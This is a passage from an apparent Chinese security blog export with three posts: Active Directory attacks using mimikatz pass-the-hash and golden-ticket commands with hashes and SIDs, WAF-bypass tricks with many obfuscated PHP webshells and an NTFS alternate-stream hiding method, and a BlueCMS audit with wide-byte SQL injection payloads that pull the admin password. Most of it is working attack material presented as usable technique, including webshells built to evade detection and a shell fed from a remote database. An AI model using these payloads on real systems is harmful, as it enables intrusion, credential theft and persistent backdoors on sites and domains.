<p>经过漫长的代码审计：发现设置Cookie的时候，他的Cookie是可以计算的，根据便宜混淆值+用户名和密码的MD5只，然后计算成一串Cookie。我们不需要知道密码，只要算出COOkie就可以成功登陆。</p>
<p>有同学会问，为啥不加密直接计算，而是计算密码的Md5只，因为数据库不存储密码，他不知道呀</p>
<p>在登陆其他用户的时候，也会这样去计算类似的情况，所以你用哈希值就可以去登陆同密码的服务器，然后因为这里是域控的账号密码，那么你可以直接用这个登陆域控</p>
<p>e5f999da18a5ab80bc15ecfc84aca7d9</p>
<p>sekurlsa::pth /user:administrator /domain:”gylq.cn” /ntlm:</p>
<p>sekurlsa::pth /user:administrator /domain:”gylq.cn” /ntlm:285deb0940e1630b59d2cd9590fcbc91</p>
<p>域控名字：WIN-NQ8TV3JGSN1.gylq.cn</p>
<p>域渗透中其实有金银票据，一个是黄金票据，一个是白银票据。一个用的是域控用户账号，一个用的是krbtgt账户金票权限是最大的，我们主讲黄金票据。</p>
<p>krbtgt账户其实就是那个KDC密钥分发中心用超管密码，我们拿着那个票据，去访问客户机，客户机会认为们是KDC秘钥分发中心，所以直接给了最高的权限允许我们访问，一般管理员会修改域控机密码，但是很少有管理员修改krbtgt的密码。那我们看看怎么伪造这个黄金票据。</p>
<p>mimikatz_trunk票据获取工具</p>
<p>log -&gt; 记录</p>
<p>lsadump::dcsync /user:krbtgt 获取krbtgt的密码 [mimikatz 会模拟域控，向目标域控请求账号密码信息]</p>
<p>提取出里面的sid和hashNTLM  注意：这里的SID是不包含-502的，千万别把-502写进去</p>
<p>kerberos::golden /admin:administrator /domain:gylq.cn /sid:S-1-5-21-204603982-2387576990-164658498 /krbtgt:7fdd8ee73326c3a028bff7e196883142 /ticket:administrator.kiribi  [制作票据]</p>
<p>kerberos::ptt administrator.kiribi    [加载票据]</p>
<p>然后打开cmd试试看票据是否有用，可以访问域控吗？    提取东西在域控，伪造在客户机</p>
<p>SID   : S-1-5-21-204603982-2387576990-164658498-502<br>  Hash NTLM: 7fdd8ee73326c3a028bff7e196883142</p>
<p>Object Security ID   : S-1-5-21-204603982-2387576990-164658498-502<br>  Hash NTLM: 7fdd8ee73326c3a028bff7e196883142</p>
<p>kerberos::golden /admin:administrator /domain:gylq.cn /sid:S-1-5-21-204603982-2387576990-164658498 /krbtgt:7fdd8ee73326c3a028bff7e196883142 /ticket:administrator.kiribi</p>
<p>kerberos::ptt administrator.kiribi</p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>bypass-绕过阻挡我们的WAF</title>
    <url>/posts/21.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="本地搭建安全狗安装坑"><a href="#本地搭建安全狗安装坑" class="headerlink" title="本地搭建安全狗安装坑"></a>本地搭建安全狗安装坑</h1><p><strong>系统服务启动的坑</strong></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415210438428-1068842948.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415210657353-2013469585.png" alt=""></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">管理员模式在apache目录执行</span><br><span class="line">httpd.exe -k install -n apache2.0</span><br><span class="line">如果要删除服务重新来，可以输下面这个，给你留着备用</span><br><span class="line">D:phpStudyApachebin&gt;httpd.exe -k install -n apache2.4</span><br><span class="line"></span><br><span class="line">sc delete apache2.0</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210415210621993-1257692856.png" alt=""></p>
<h1 id="简介WAF"><a href="#简介WAF" class="headerlink" title="简介WAF"></a>简介WAF</h1><p><strong>WAF是一个缩写，全名web应用防护系统（Web Application Firewall），是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品</strong></p>
<p><strong>Waf有硬件类型也有软件类型的，但是其实在我看来，从绕过Waf机制上来说，区别不大，我们一般渗透测试都会遇到软Waf，因为硬件waf价格有点昂贵，正常企业不会购买，所以基本是GOV站点或者国网、运营商等国企才会大规模装配。</strong></p>
<p><strong>常见的软Waf，：安全狗、云锁、云盾、悬镜、护卫神</strong></p>
<h1 id="bypass是什么？"><a href="#bypass是什么？" class="headerlink" title="bypass是什么？"></a><strong>bypass是什么？</strong></h1><p>bypass他就是绕过的意思，我们渗透测试人员通过特殊语句的构建进行渗透测试，然后达到绕过waf的手法</p>
<blockquote>
<p>waf检测机制其实很简单，核心就是正则匹配，虽然说还有字符串强行匹配，还有什么语义解析，但是实际上还是正则居多。</p>
</blockquote>
<hr>
<p><strong>waf的核心，通过正则匹配，如果符合规则，就拦截。 and 1=1 拦截</strong></p>
<p>and 1=1 =&gt; And 1=1 =&gt; 因为Waf获得数据之后不会去解码 </p>
<p>and 1=1</p>
<p>and =&gt;&amp;<br>1=1 =&gt; -1=-1 </p>
<p>/**/ 数据库注射</p>
<p>/*!*/内联注释//可以运行 最新版被拦截</p>
<p>union select =&gt; union /*10044!select*/ <strong>最新版基本被拦截</strong></p>
<p>/*%0a */</p>
<p>– qwe /*%0a</p>
<p>  – qwe/* %0a union select 1,2 from admin limit 1,1 – qwe*/</p>
<p>内联注释<br>特殊字符 =&gt; %0a 换行</p>
<p>iis  传参里面 s%e%l%e%c%t =&gt; select<br>Apache Hpp</p>
<p><a href="http://192.168.136.129/?id=1/\*&amp;id=2%23*/" target="_blank" rel="noopener">http://192.168.136.129/?id=1/\*&amp;id=2%23*/</a></p>
<p><a href="http://59.63.200.79:8003/?id=1/\*&amp;id=2" target="_blank" rel="noopener">http://59.63.200.79:8003/?id=1/\*&amp;id=2</a> union select 1,2 from admin limit 1,1#*/</p>
<hr>
<blockquote>
<p><strong>记住一句话，安全和客户体验都是需要平衡的，特别是对于Waf而言，你想像，用了waf之后，然后网页动不动就拦截，比如我是用户，然后因为我用户名叫and然后我就被拉黑了，因为我不小心输入个’页面就出问题，这个当然不可以，所以waf一般都是通用的，并不是单独定制的，既然是通用的，那么他拦截上会比较谨慎，所以waf的正则一般是搭配的。’</strong></p>
</blockquote>
<p><strong>我们既然知道waf通过正则匹配，那么你们第一个反应就是，替换函数对不对  例如：id= 1 and 1=1 waf对and进行了拦截，那么我们是不是得尝试找到替换and的东西，那么运算符就能帮上我们，例如：&amp;</strong></p>
<blockquote>
<p>但是输入时候我们发现只写and是不会被拦截的，那么我们想办法改一改 1=1，可以试试-1=-1</p>
</blockquote>
<p><strong>甚至例如直接传参，我使用加减符号，乘除符号运算，或者是字符串传参直接用16进制也可以绕过这个waf</strong></p>
<p>这里要讲一个东西叫做内联注释。</p>
<p><strong>内联注释是Mysql为了保持与其他数据兼容，将Mysql中特有的语句放在/*!…<em>/中，这些语句在不兼容的数据库中不执行，而在mysql自身却能识别，执行。/\</em>!50001*/表示数据库版本&gt;=5.00.01时中间的语句才能被执行</strong></p>
<h1 id="常见绕过手法"><a href="#常见绕过手法" class="headerlink" title="常见绕过手法"></a>常见绕过手法</h1><p><strong>1、大小写绕过（很老的waf才有用）</strong></p>
<p><strong>2、替换绕过（很老的waf才有用）【和上传文件那个漏洞一样】</strong></p>
<p><strong>3、特殊字符绕过（%0a换行）</strong></p>
<p><strong>4、编码绕过（比如会多次解码的东西，例如我们DOM XSS绕狗那个）</strong></p>
<p><strong>5、等价替换（利用其它函数替代）[union #%0aselect 拦截] [uinon all #%0aselect 不拦截]</strong></p>
<p><strong>6、容器特性（例如Apache的hpp或者iis的%分割）</strong></p>
<p><strong>7、白名单（管理员权限或者是127.0.0.1本地访问不拦截）</strong></p>
<p><strong>8、缓冲区（数据太多了超出了waf检测的范围）</strong></p>
<hr>
<h1 id="Bypass-Sql注入绕过"><a href="#Bypass-Sql注入绕过" class="headerlink" title="Bypass Sql注入绕过"></a>Bypass Sql注入绕过</h1><p>Bypass webshell 的绕过 <strong>一句话木马 (webshell)</strong></p>
<p><strong><?php eval($_REQUEST[a]); ?></strong></p>
<p>=&gt; 替换 eval  替换$_REQUEST[a] =&gt; 超全局变量</p>
<p>​                    <strong>——笔录</strong></p>
<hr>
<h2 id="end-函数绕过waf"><a href="#end-函数绕过waf" class="headerlink" title="end()函数绕过waf"></a>end()函数绕过waf</h2><p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094040398-1396797817.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094158639-355224543.png" alt=""><br><strong>我们可以想想如何绕过waf的拦截，不使用[]来进行传参执行呢，我们发现end()函数能够输出数组中的当前元素和最后一个元素的值</strong><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094358893-1086798163.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094455153-1742373616.png" alt=""></p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094708000-230214879.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417094717956-544626602.png" alt=""></p>
<h2 id="通过常量定义绕过waf"><a href="#通过常量定义绕过waf" class="headerlink" title="通过常量定义绕过waf"></a>通过常量定义绕过waf</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php define(&quot;a&quot;,&quot;$_REQUEST[a]&quot;);eval(a)?&gt;;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417095449246-195649711.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417095518746-231682179.png" alt=""></p>
<h2 id="通过字符串拼接-双美元符号"><a href="#通过字符串拼接-双美元符号" class="headerlink" title="通过字符串拼接+双美元符号"></a>通过字符串拼接+双美元符号</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a=<span class="string">'ass'</span>;</span><br><span class="line">	$b=<span class="string">'ert'</span>;</span><br><span class="line"> 	$funcName=$a.$b; <span class="comment">//assert</span></span><br><span class="line">	$x=<span class="string">'funcName'</span>;</span><br><span class="line">	$$x($_REQUEST[<span class="number">1</span>]); <span class="comment">//$funcName =&gt; assert[$_REQUEST[1]]</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417100634742-82362787.png" alt=""></p>
<h2 id="通过定义函数强行分割"><a href="#通过定义函数强行分割" class="headerlink" title="通过定义函数强行分割"></a>通过定义函数强行分割</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> $a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(a($_REQUEST)[a]); <span class="comment">//强行分割$_POST['a']</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417101334645-1028388129.png" alt=""></p>
<h2 id="通过类定义，然后传参强行分割"><a href="#通过类定义，然后传参强行分割" class="headerlink" title="通过类定义，然后传参强行分割"></a>通过类定义，然后传参强行分割</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $name=<span class="string">''</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="string">"$this-&gt;name"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user= <span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;name=<span class="string">''</span>.$_REQUEST[a];</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417103047413-86501604.png" alt=""></p>
<h2 id="多种方式传参免杀"><a href="#多种方式传参免杀" class="headerlink" title="多种方式传参免杀"></a>多种方式传参免杀</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$COOKIE = $_COOKIE;<span class="comment">//获取Cookie传参 数组; a=1 $key=a $value=1;</span></span><br><span class="line"><span class="keyword">foreach</span>($COOKIE <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">	<span class="keyword">if</span>($key==<span class="string">'assert'</span>)&#123;</span><br><span class="line">		$key($_REQUEST[a];)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417103901765-345712183.png" alt=""></p>
<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=get_defined_functions();<span class="comment">//返回已经定义的函数给我 二维数组</span></span><br><span class="line">$a[<span class="string">"internal"</span>][<span class="number">847</span>]($_REQUEST[<span class="string">"a"</span>]);</span><br></pre></td></tr></table></figure></div>

<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210417110411852.png" alt="image-20210417110411852"></p>
<p><strong><em>以上在安全狗环境测试</em></strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]===<span class="string">'1'</span>)</span><br><span class="line">&#123;<span class="keyword">eval</span>(end(%_REQUEST));&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417111557580-2017515423.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417111624953-21953834.png" alt=""></p>
<h2 id="拿到shell之后藏shell的妙招：-ntfs文件流"><a href="#拿到shell之后藏shell的妙招：-ntfs文件流" class="headerlink" title="拿到shell之后藏shell的妙招： ntfs文件流"></a>拿到shell之后藏shell的妙招： ntfs文件流</h2><blockquote>
<p>NTFS文件流，文件上传 1.jpg:2.txt</p>
<p>cmd 中 echo  xxx &gt;&gt; 1.txt:2.txt  dir /r 可以查看数据流::$date</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cmd中命令</span><br><span class="line">www&#x2F;echo &quot;&lt;?php eval($_REQUEST[a]);?&gt;&quot; &gt;&gt; &#x2F;:1.txt</span><br><span class="line"></span><br><span class="line">j.php中包含代码</span><br><span class="line">&lt;?php include(&#39;&#x2F;:1.txt&#39;); ?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417125948529-1147838311.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417130024856-884945110.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417130054721-818702029.png" alt=""></p>
<h2 id="（终极手法-绕过市面上所有Waf"><a href="#（终极手法-绕过市面上所有Waf" class="headerlink" title="（终极手法)绕过市面上所有Waf"></a>（终极手法)绕过市面上所有Waf</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">assert(mysqli_fetch_assoc(mysqli_query(mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'maoshe'</span>),<span class="string">'select * from info'</span>))[<span class="string">'info'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417133241901-2067697455.png" alt=""><br><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417133319502-927493245.png" alt=""></p>
<blockquote>
<p>提示：可以通过<strong>香港云</strong>各种网上的数据库进行连接然后传参getshell   用这段代码连接自己香港云的服务器可以达到getshell</p>
</blockquote>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210417134454426-1421162419.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>以上就是关于waf的sql注入的一些绕过</p>
<p>和一句话木马的各种骚操作和终极绕过思考办法。</p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>0day审计实战案例</title>
    <url>/posts/90.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="代码审计的思路"><a href="#代码审计的思路" class="headerlink" title="代码审计的思路"></a><strong>代码审计的思路</strong></h1><blockquote>
<p>代码审计核心在于通过源代码，知道代码如何执行，然后根据代码执行中可能产生的问题来寻找漏洞。</p>
</blockquote>
<p><em>代码审计一般泛指白盒审计，但是要记住，通用性漏洞，例如CMS通杀漏洞，其实并不是仅仅只有代码审计能好到，本地搭建然后纯黑盒测试也可以的。只不过代码审计更为全面的容易找到漏洞</em></p>
<blockquote>
<p>代码审计其实思路很简单，一共两条路线，全文通读和敏感函数定位。</p>
</blockquote>
<p><em>全文通读：我看了每一行代码不是还不够清楚吗？</em></p>
<p><em>敏感函数定位：掌握住可以存在危险函数的地方 反推</em></p>
<hr>
<p>渗透测试人员 -&gt; 渗透测试 -&gt; 找漏洞 -&gt; 找Bug -&gt; 开发人员的技术不到关|衔接问题|项目经理得罪了|任何原因</p>
<p>安全不能孤立：业务方便 &lt;-&gt; 安全 (没有绝对的安全)-&gt;纳什均衡 =&gt; 漏洞一定存在</p>
<p>代码设计的核心    </p>
<p>变量覆盖 $$</p>
<p>文件包含  include  </p>
<p>黑盒渗透测试 -&gt; 信息收集<br>如果没有功能没有传参，怎么可能拿得下</p>
<p>黑盒部分 -&gt; 寻找功能点 -&gt; SQL注入 -&gt; XSS -&gt; CSRF -&gt; XXE -&gt; SSRF -&gt; 文件上传 -&gt; 逻辑漏洞  &lt;=&gt; 验证码绕过、密码找回、支付漏洞、越权</p>
<p>白盒部分 -&gt; 变量覆盖-&gt; 文件包含 -&gt; 反序列化</p>
<p>黑盒测试没成功 -&gt; 为什么 -&gt; 过滤 &lt;=&gt; 传参错误 -&gt; 过滤规则、传参后参数经过什么处理？</p>
<p>CMS是个通用的东西，但是你的环境不一定和所有人相同，php肯定要交互数据库，你的数据库密码和库名不可能和每个人相同</p>
<pre><code>**——笔录**</code></pre><hr>
<blockquote>
<p>*<em>无论是哪一个审计方法都需要一定的编程功底，但是如果你的编程功底不够怎么办？ *</em></p>
<p><em>等死吗</em></p>
<p><strong><em>也并不是</em>，其实也可以尝试使用黑盒+白盒代码审计的方式进行一个学习，通过黑盒的方式来进行测试，然后去了解究竟传参进去经过处理发生了什么？</strong></p>
<p>然后构建出合适的语句进行尝试，最后找到问题所在点。</p>
<p>思路就是这个两个，具体的会用曾经写的文章为案例进行分析。</p>
</blockquote>
<h1 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h1><p><strong>测试</strong>CMS：<strong>BlueCMS</strong></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/90c11f347df84642902046bf35ea91d8.png" alt=""></p>
<p>一、安装板块 install  能不能多次安装 </p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5c777ff574302a7fc07fd380952aa738.png" alt=""></p>
<blockquote>
<p><strong>1、重复安装代表着你能破坏网站</strong></p>
<p><strong>2、重复安装你能进入后台</strong></p>
<p><strong>站库分离 =&gt; 数据库 和网站不在同一个机器</strong></p>
<p><strong>3、其实重装的时候也会产生安全问题</strong></p>
<p><strong>网站访问数据库，你的数据库账号密码会储存在哪里？ 配置文件</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6068ca3abacea254875039b7bb0e61f9.png" alt=""></p>
<p>安全防御 </p>
<pre><code>内网比外网弱、后台比前台弱</code></pre><p>边缘知识你们不知道 、 这个叫做骚姿势</p>
<h2 id="漏洞地方1：进入注册窗口可以通过burp用户名已存在爆破出用户"><a href="#漏洞地方1：进入注册窗口可以通过burp用户名已存在爆破出用户" class="headerlink" title="漏洞地方1：进入注册窗口可以通过burp用户名已存在爆破出用户"></a>漏洞地方1：进入注册窗口可以通过burp用户名已存在爆破出用户</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/286cf0d35201bb45ca222fb185b15561.png" alt=""></p>
<blockquote>
<p>burp抓包之后看到一个act的传参，在代码审计中查询<strong>do_reg</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/img_convert/267ef480449e94abffe57b528173ed61.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5d825306a14124ee776742e9f1884d62.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/38466d691b3f3b299f801e4e2a0aa980.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f8a48a8dd0c54d27ca478fa401eacf56.png" alt=""></p>
<blockquote>
<p>*<em>由此可以看出后端是使用insert进行数据库插入，这里可能存在Mysql注入，也没看到XSS过滤可能存在，我们去实践一下 *</em></p>
</blockquote>
<h2 id="漏洞地方2：白盒审计注入以及XSS"><a href="#漏洞地方2：白盒审计注入以及XSS" class="headerlink" title="漏洞地方2：白盒审计注入以及XSS"></a>漏洞地方2：白盒审计注入以及XSS</h2><blockquote>
<p><em>进行mysql监控查看我们输入的数据，并且在</em></p>
<p><strong><em>1、注册页面进行单引号双引号和#号进行mysql注释测试，2、明显有前端测试，我们用burp抓包进行修改邮箱进行sql注入测试，注册成功表明我们输入的单引号和双引号闭合，和#注释并没有起到作用，</em></strong></p>
<p><strong><em>3、我们去审计里面看看是什么操作，明显发现有魔术引号，这里我们可以使用宽字节注入进行闭合操作，根据sql语句的语法，补全value的值，进行sql注入</em></strong></p>
<p><strong><em>4、明显出现了报错，这里可以尝试报错注入使用updataxml进行中的0x7e和路径拼接报错数据库，在本地环境执行、弹出数据库报错，但是网页上怎么也报不出来，问题暂时未知，可以用盲注进行SQL注入。</em></strong></p>
<p><strong><em>5、接着我们进行XSS，结果弹框了，可以用存储型XSS获得adminCookie</em></strong></p>
<p><strong><em>6、延续SQL注入，insert into这个语法可以插入多行数据，我们可以试试进行信息插入，我们继续mysql监控审计姓账号是字符串可以用0x十六进制代替,虽然报错了，但是上传打到了本地数据库并且可以确定数据语句执行了，接着我们可以直接查询管理员密码和md5解码</em></strong></p>
<p><strong><em>7、万能密码用户登录测试成功</em></strong></p>
</blockquote>
<p>汉’,1,1),(1012,0x646a646a,md5(123456),(select pwd from blue_admin limit 0,1),1,1)#</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;admin123&#39;, md5(&#39;admin1&#39;), &#39;admin&#39; or updatexml(1,concat(0x7e,(select database())),1),1,1)#1123@qq.com&#39;, &#39;1618314159&#39;, &#39;1618314159&#39;)</span><br><span class="line"></span><br><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;admin123&#39;, md5(&#39;admin1&#39;), &#39;admin汉&#39;,1,1),(100,0x646a646a646a646a,md5(123456),(select pwd from blue_admin limit 0,1),1,1)#1123@qq.com&#39;, &#39;1618314159&#39;, &#39;1618314159&#39;)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/img_convert/df616ffef32f3f93e5c267d62adb4583.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/0d34cbaedf33d069faf9336c5bf7df19.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/8c7c0d8e6cb530a60776ff34879deb6b.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/bbe71842ce4954e28ff96e794b8e5bcb.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/9ff02ea5dcb7a887bf224d099c2108c9.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/71257e0418f3df089ce38d9c72e48122.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/994965bb49ac6b977ac263380a20485c.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/86b5db5d39da9be6bf22d3ed2a44b0f8.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/52b0f9f6fb368024f08aab7138d2a3e2.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/2edc6bb751d1e462655ef89c57b08e96.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/25fff213f16cd56a3c19d5b1743451a5.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/18bd17d73ebc3e6facd30b5e02e1c855.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/bfcfd10708c15371fc66f0181844e33d.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b6b31252a8dbb9b77bc10c596164188f.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9dcfc5494d2ebd85da3e03455bdfa2c8.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/2183da808f782910ce68c7eb2745ada7.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c83ae4476911bc030ead57e42109fdcd.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/1432cde2910712c848c853b0a20e7586.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/cfdac9cf676c9bbbd24bc23e9ac4e7bb.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/3d0f4005d346630597dce406fc4fa2a6.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/feccee5008c65024b71bfe8f197c5f1d.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e0c7a643631835491fefaa931a3c683b.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/1c8ff014d17ec67934614975b5d99878.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/74816800bbd54f7ea3581baf59f5b275.png" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/642bfc6d29835999230f0393a08279aa.png" alt=""></p>
<h3 id="获得管理员密码"><a href="#获得管理员密码" class="headerlink" title="获得管理员密码"></a><strong>获得管理员密码</strong></h3><p><img src="https://img-blog.csdnimg.cn/img_convert/db7f53fd7811d2f89cd230b4fadc5300.png" alt=""><br><img src="https://img-blog.csdnimg.cn/img_convert/8dadcb62db66fed2fba963e91b067fd3.png" alt=""></p>
<h3 id="万能密码漏洞"><a href="#万能密码漏洞" class="headerlink" title="万能密码漏洞"></a>万能密码漏洞</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/5706b2d2e4b11b4087ce7b7b71a082f8.png" alt=""></p>
<hr>
<p>SESSION 变量覆盖</p>
<p>验证码死都对不上 SESSION</p>
<p>网站存在SQL注入的时候，我们其实要注意，当这个页面存在，代表着可能很多页面都会中枪</p>
<p>后台比前台脆弱的多</p>
<p>内网比外网脆弱的多</p>
<p>宽字节核心 魔术引号 在‘ “ \前面加一个\</p>
<p>GET POST COOKIE 传参都会被魔术引号处理</p>
<hr>
<p>INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)<br>             VALUES (‘’, ‘1’, ‘1’, ‘1’, ‘6’, ‘ewafwaf’, ‘1618386586’, ‘192.168.136.1’, ‘1’)</p>
